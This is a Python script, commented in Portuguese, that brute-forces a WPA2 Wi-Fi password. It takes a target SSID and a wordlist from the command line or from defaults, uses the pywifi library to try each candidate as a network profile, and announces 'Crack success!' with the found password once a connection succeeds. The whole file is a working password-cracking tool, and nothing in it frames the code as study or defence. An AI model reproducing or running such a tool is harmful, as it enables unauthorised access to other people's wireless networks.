import argparse
import sys , os , os.path , platform
import re
import time
import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile

client_ssid = "Nome da sua Rede"
path_to_file = r"./brute_password_list.txt"
print(path_to_file)

#Personalizações no terminal
RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan()
    results = ifaces.scan_results()

    wifi = pywifi.PyWiFi() 
    iface = wifi.interfaces()[0]

except:
    print("[-] Error system")

type = False

def main(ssid, password, number):
    profile = Profile()  #Instancia de usuario
    profile.ssid = ssid  #Nome Client
    profile.auth = const.AUTH_ALG_OPEN #Algoritmo de teste para auth
    profile.akm.append(const.AKM_TYPE_WPA2PSK) #Key test
    profile.cipher = const.CIPHER_TYPE_CCMP #Tipo do Cipher

    profile.key = password #Gerando passwords da lista
    iface.remove_all_network_profiles() #Remove Profiles anteriores ao computador
    tmp_profile = iface.add_network_profile(profile) #Seta um novo Profile
    time.sleep(0.3) #Time
    iface.connect(tmp_profile) #Tentar conexão
    print(tmp_profile)
    time.sleep(0.1) #Pausa

    if ifaces.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print(BOLD, GREEN,'[*] Crack success!',RESET)
        print(BOLD, GREEN,'[*] password is ' + password, RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, '[{}] Crack Failed using {}'.format(number, password))

#Exbir e ler o arquivo
def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)
                    
def menu(client_ssid,path_to_file):
    parser = argparse.ArgumentParser(description='argparse Example')
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')
    print()
    args = parser.parse_args()
    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(1.5)

    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    else:
        print(BLUE)
        ssid = client_ssid
        filee = path_to_file 

    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")

        print(BLUE,"[~] Cracking...")
        print(ssid)
        print(filee)
        pwd(ssid, filee)

    else:
        print(RED,"[-] No Such File.",BLUE)

#Main function
menu(client_ssid , path_to_file)
